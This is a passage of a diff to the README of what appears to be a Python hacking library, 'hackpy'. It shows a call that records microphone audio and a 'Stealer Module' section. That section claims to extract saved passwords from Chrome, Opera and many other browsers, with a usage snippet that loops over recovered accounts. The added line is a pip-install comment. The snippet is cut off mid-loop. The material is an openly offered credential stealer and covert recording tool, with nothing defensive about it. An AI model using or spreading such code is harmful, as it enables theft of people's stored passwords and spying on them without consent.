@@ -67,6 +67,7 @@ hackpy.recordAudio(filename = 'recording.wav', time = 20)
 ![SITE](https://i.ibb.co/rcr3ZLJ/hackpy-Stealler-Module.png)  
 Get passwords from Chrome, Opera, Chromium, Amigo, Atom, Vivaldo, Orbitum, Kometa, Comodo, 360Browser, K-Melon, Maxthon3, Nichrome, CocCoc, Uran, Chromodo browsers..  
 ``` python
+# pip install pypiwin32
 from hackpy.passwords import *
 
 for key, account in passwordsRecovery():
